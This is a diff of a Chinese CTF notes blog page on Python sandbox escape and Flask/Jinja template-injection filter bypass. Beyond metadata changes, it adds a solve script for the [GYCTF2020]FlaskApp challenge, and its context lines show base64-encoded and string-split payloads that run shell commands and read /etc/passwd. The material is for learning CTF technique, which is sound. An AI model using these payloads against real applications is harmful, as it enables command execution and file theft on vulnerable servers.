@@ -94,7 +94,7 @@
 <meta property="og:description" content="前言最近需要加紧修炼，听取师傅建议，博文还是当作笔记来看待，自己能看懂即可。 如有问题欢迎指教 : )  QICQ：1609410364 前置知识   名称 介绍    __dict__ 这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性   __class__ 返回一个实例对应的类型   __base__ 返回一个类所继承的基类   __subclasses__() 返回该">
 <meta property="og:image" content="https://s2.ax1x.com/2019/07/06/Z0NUje.png">
 <meta property="article:published_time" content="2019-10-23T15:48:44.000Z">
-<meta property="article:modified_time" content="2019-10-24T07:51:49.694Z">
+<meta property="article:modified_time" content="2020-05-04T08:00:10.586Z">
 <meta property="article:author" content="sketch_pl4ne">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -144,7 +144,7 @@
 
 
 
-<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="sketch_pl4ne" type="application/atom+xml">
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="sketch_pl4ne" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -311,7 +311,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.8k
+                  1.9k
                 </span>
               
 
@@ -426,7 +426,13 @@
 
 <h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原语句</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br><span class="line"><span class="comment"># 编码后</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].	__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ZXZhbA=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">"X19pbXBvcnRfXygnb3MnKS5wb3Blbignd2hvYW1pJykucmVhZCgp"</span>.decode(<span class="string">'base64'</span>))</span><br></pre></td></tr></table></figure>
 
-<p>同理也可以进行其他种类编码。</p>
+<p>同理也可以进行其他种类编码。下面是一道例题：</p>
+<p><strong>[GYCTF2020]FlaskApp</strong></p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c2db084a-c531-4ecf-8f13-61b4973a1d7c.node3.buuoj.cn/decode"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">a = <span class="string">'&#123;&#123;"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["o"+"s"]["po"+"pen"]("ca"+"t /this_is_the_fl"+"ag.txt").read()&#125;&#125;'</span></span><br><span class="line"><span class="comment"># &#123;&#123;"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["cG9wZW4=".decode("base64")]("whoami").read()&#125;&#125;</span></span><br><span class="line"><span class="keyword">print</span> base64.b64encode(<span class="string">"os"</span>)</span><br><span class="line">text = base64.b64encode(a)</span><br><span class="line"><span class="keyword">print</span> text</span><br><span class="line">data = &#123;<span class="string">'text'</span>: text, <span class="string">'submit'</span>:<span class="string">'提交'</span>&#125;</span><br><span class="line">r = s.post(url, data).text.encode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'no no no'</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">    <span class="keyword">print</span> r</span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="Bypass-中括号"><a href="#Bypass-中括号" class="headerlink" title="Bypass 中括号"></a>Bypass 中括号</h3><p>读文件</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">40</span>)(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>
 
@@ -610,7 +616,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -623,7 +629,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
@@ -716,7 +722,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">38.1k</span>
+    <span title="Site words total count">38.7k</span>
   
 </div>
 
